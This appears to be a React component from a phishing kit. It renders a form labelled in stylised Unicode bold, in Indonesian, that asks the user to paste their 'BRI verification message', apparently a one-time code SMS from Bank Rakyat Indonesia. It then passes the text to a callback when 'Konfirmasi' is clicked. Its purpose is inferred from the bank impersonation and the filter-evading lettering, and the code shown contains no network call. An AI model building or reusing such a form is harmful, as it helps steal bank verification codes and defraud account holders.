
import React from 'react'

const SiteVerifikasi = ({btnClick}) => {
  const handleClick = (e) => {
    e.preventDefault()
    const data = {
      message: document.getElementById('msg').value,
    }
    btnClick(data)
  }
  return (
    <>      
        <form>
            <label className='label-control'>𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐏𝐞𝐬𝐚𝐧 𝐕𝐞𝐫𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐁𝐑𝐈</label>
            <textarea id='msg' className='form-control' rows={7}></textarea>
            <button type='button' onClick={handleClick} className='btn' id='btn' style={{marginTop:'-0.2em', marginBottom:'2em'}}>
              Konfirmasi
            </button>
        </form>
    </>
  )
}

export default SiteVerifikasi